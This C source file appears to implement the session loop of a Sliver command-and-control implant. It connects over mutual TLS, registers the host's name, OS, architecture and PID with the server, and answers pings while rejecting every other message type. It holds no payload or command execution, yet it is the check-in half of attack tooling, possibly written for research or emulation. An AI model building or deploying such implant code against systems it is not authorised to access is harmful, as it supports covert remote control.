/* src/modes/session.c - interactive session loop over mtls. */
#include "sliver/session.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "sliver/frame.h"
#include "sliver/log.h"
#include "sliver/transport.h"
#include "sliver/yamux.h"

typedef struct {
  sliver_yamux_t *y;
  uint32_t stream_id;
  int failed;
} session_stream_t;

static long stream_read(void *ctx, void *buf, size_t len) {
  session_stream_t *s = (session_stream_t *)ctx;
  long n = sliver_yamux_read(s->y, s->stream_id, buf, len);
  if (n < 0) {
    s->failed = 1;
  }
  return n;
}

static long stream_write(void *ctx, const void *buf, size_t len) {
  session_stream_t *s = (session_stream_t *)ctx;
  if (sliver_yamux_write(s->y, s->stream_id, buf, len) != 0) {
    s->failed = 1;
    return -1;
  }
  return (long)len;
}

static long tls_read(void *ctx, void *buf, size_t len) {
  return sliver_tls_read((sliver_tls_t *)ctx, buf, len);
}

static long tls_write(void *ctx, const void *buf, size_t len) {
  return sliver_tls_write((sliver_tls_t *)ctx, buf, len);
}

/* Sends one signed envelope on a fresh stream and half-closes it. */
static int send_envelope(sliver_yamux_t *y, sliver_frame_signer_t *signer,
                         const void *envelope, size_t len) {
  session_stream_t stream;
  uint32_t sid = 0;
  int rc;

  if (sliver_yamux_open(y, &sid) != 0) {
    return -1;
  }
  stream.y = y;
  stream.stream_id = sid;
  stream.failed = 0;
  rc = sliver_frame_write(signer, stream_write, &stream, envelope, len);
  (void)sliver_yamux_close_write(y, sid);
  return rc;
}

/* Builds Envelope{ID, UnknownMessageType = true}. */
static int encode_unknown_reply(sliver_buf_t *out, int64_t id) {
  sliver_buf_init(out);
  if (sliver_buf_put_int64(out, 1, id) != 0) {
    return -1;
  }
  return sliver_buf_put_bool(out, 4, 1);
}

int sliver_session_run(const sliver_session_config_t *cfg) {
  sliver_tls_t *tls = NULL;
  sliver_yamux_t yamux;
  sliver_frame_signer_t signer;
  sliver_buf_t reg_buf, env_buf;
  sliver_register_t reg;
  char err[256];
  int rc = -1;
  int yamux_ready = 0;

  if (cfg == NULL || cfg->host == NULL || cfg->ca_pem == NULL ||
      cfg->age_private_key == NULL || cfg->server_minisign_pubkey == NULL) {
    return -1;
  }

  sliver_buf_init(&reg_buf);
  sliver_buf_init(&env_buf);

  if (sliver_frame_signer_init(&signer, cfg->age_private_key) != 0) {
    LOG_ERROR("session: cannot derive envelope signing key");
    return -1;
  }

  err[0] = '\0';
  if (sliver_tls_connect(&tls, cfg->host, cfg->port, cfg->ca_pem, cfg->cert_pem,
                         cfg->key_pem, err, sizeof(err)) != 0) {
    LOG_ERROR("session: %s", err);
    return -1;
  }
  LOG_INFO("session: handshake ok (%s / %s)", sliver_tls_version(tls),
           sliver_tls_ciphersuite(tls));

  if (sliver_tls_write(tls, SLIVER_YAMUX_PREFACE, SLIVER_YAMUX_PREFACE_LEN) !=
      SLIVER_YAMUX_PREFACE_LEN) {
    LOG_ERROR("session: MUX/1 write failed");
    goto out;
  }
  if (sliver_yamux_client(&yamux, tls_read, tls_write, tls) != 0) {
    goto out;
  }
  yamux_ready = 1;

  /* Register: Envelope{Type = MsgRegister, Data = Register}. */
  reg = cfg->reg;
  (void)snprintf(reg.active_c2, sizeof(reg.active_c2), "mtls://%s:%u", cfg->host,
                 (unsigned)cfg->port);
  if (sliver_register_encode(&reg_buf, &reg) != 0 ||
      sliver_envelope_encode(&env_buf, 0, SLIVER_MSG_REGISTER, reg_buf.data,
                             reg_buf.len) != 0) {
    LOG_ERROR("session: cannot encode register");
    goto out;
  }
  if (send_envelope(&yamux, &signer, env_buf.data, env_buf.len) != 0) {
    LOG_ERROR("session: register send failed");
    goto out;
  }
  sliver_buf_free(&env_buf);
  sliver_buf_init(&env_buf);
  LOG_INFO("session: registered as %s (%s/%s, pid %d)", reg.name, reg.os, reg.arch,
           reg.pid);

  /* Serve server initiated streams until the connection dies. */
  for (;;) {
    uint32_t sid = 0;
    session_stream_t stream;
    sliver_envelope_t envelope;

    if (sliver_yamux_accept(&yamux, &sid) != 0) {
      LOG_INFO("session: connection closed");
      rc = 0;
      break;
    }
    stream.y = &yamux;
    stream.stream_id = sid;
    stream.failed = 0;

    if (sliver_frame_read(cfg->server_minisign_pubkey, stream_read, &stream, &env_buf) != 0) {
      LOG_WARN("session: bad frame on stream %u", sid);
      (void)sliver_yamux_close_write(&yamux, sid);
      continue;
    }
    if (sliver_envelope_decode(env_buf.data, env_buf.len, &envelope) != 0) {
      LOG_WARN("session: bad envelope on stream %u", sid);
      sliver_buf_free(&env_buf);
      (void)sliver_yamux_close_write(&yamux, sid);
      continue;
    }

    if (envelope.type == SLIVER_MSG_PING) {
      int32_t nonce = 0;
      (void)sliver_ping_decode_nonce(envelope.data, envelope.data_len, &nonce);
      LOG_INFO("session: ping from server (nonce %d)", nonce);
    } else {
      sliver_buf_t reply;
      LOG_INFO("session: unsupported message type %u, sending UnknownMessageType",
               envelope.type);
      if (encode_unknown_reply(&reply, envelope.id) == 0) {
        (void)sliver_frame_write(&signer, stream_write, &stream, reply.data, reply.len);
        sliver_buf_free(&reply);
      }
    }
    sliver_buf_free(&env_buf);
    sliver_buf_init(&env_buf);
    (void)sliver_yamux_close_write(&yamux, sid);
  }

out:
  sliver_buf_free(&reg_buf);
  sliver_buf_free(&env_buf);
  if (yamux_ready) {
    sliver_yamux_free(&yamux);
  }
  if (tls != NULL) {
    sliver_tls_close(tls);
  }
  return rc;
}
